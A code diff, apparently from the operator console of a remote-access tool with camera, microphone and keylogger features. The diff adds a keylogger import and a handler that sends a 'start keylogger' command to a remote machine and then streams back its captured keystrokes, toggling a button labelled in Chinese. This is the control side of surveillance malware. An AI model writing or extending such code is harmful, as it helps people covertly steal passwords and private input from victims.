@@ -2,6 +2,7 @@ import asyncio
 from camera import *
 from pynput import keyboard
 from microphone import *
+from keylogger import *
 
 
 
@@ -132,13 +133,27 @@ async def openmicrophone(GUI):
 async def keylogger(GUI):
     # 这里放具体的操作
     try:
-        operation = "Hello, Server!"
-        GUI.connections["keylogger"]["writer"].write(operation.encode())
-        await GUI.connections["keylogger"]["writer"].drain()
-        GUI.append_log(f"[*] Sent operation: {operation}")
+        if GUI.keylogger.text() == "键盘记录":
+            GUI.keylogger_check =True
+            operation = "start keylogger"
+            GUI.connections["keylogger"]["writer"].write(operation.encode())
+            await GUI.connections["keylogger"]["writer"].drain()
+            GUI.append_log(f"[*] Sent operation: {operation}")
 
-        GUI.append_log("[*] Waiting for response...")
-        response = await GUI.connections["keylogger"]["reader"].read(1024)
-        GUI.append_log(f"[*] Received response: {response.decode('utf-8')}")
+            GUI.append_log("[*] Waiting for response...")
+            response = await GUI.connections["keylogger"]["reader"].read(1024)
+            GUI.append_log(f"[*] Received response: {response.decode('utf-8')}")
+
+            # 切换按钮文本为 "停止键盘记录"
+            GUI.keylogger.setText("停止键盘记录")
+            # 启动键盘记录接收
+            win_manager = KeyloggerManager()
+            await receive_keylogger_stream(GUI,win_manager)
+        else:
+            # 停止键盘记录
+            GUI.keylogger_check = False
+            GUI.keylogger.setText("键盘记录")
     except Exception as e:
         GUI.append_log(f"[!] Unexpected error: {e}")
+
+
